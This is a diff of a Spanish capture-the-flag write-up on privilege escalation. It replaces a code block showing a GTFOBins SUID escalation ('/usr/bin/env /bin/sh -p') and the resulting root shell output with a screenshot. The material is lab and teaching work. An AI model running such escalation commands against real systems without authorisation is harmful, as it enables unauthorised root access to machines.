@@ -178,22 +178,4 @@ Ahora nos podemos dirigir al sitio web [GTFOBins](https://gtfobins.github.io/) p
 
 Como sudo está desactivado podemos ahorrarnos la primera línea y apuntar directamente a la ruta del binario, consiguiendo así rootear la máquina.
 
-```
-> /usr/bin/env /bin/sh -p
-
-# ls -la /root     
-
-total 20
-drwx------ 1 root root  112 May 13 12:33 .
-drwxr-xr-x 1 root root  174 Sep 23 12:21 ..
--rw------- 1 root root   59 May 13 12:33 .bash_history
--rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
-drwxr-xr-x 1 root root   10 Mar 25 17:36 .local
--rw------- 1 root root  979 Mar 25 17:57 .mysql_history
--rw-r--r-- 1 root root  161 Jul  9  2019 .profile
--rw------- 1 root root 1821 Mar 25 17:31 .viminfo
-
-# whoami
-root
-```
-
+![](../../../Images/Pasted%20image%2020240923104053.png)
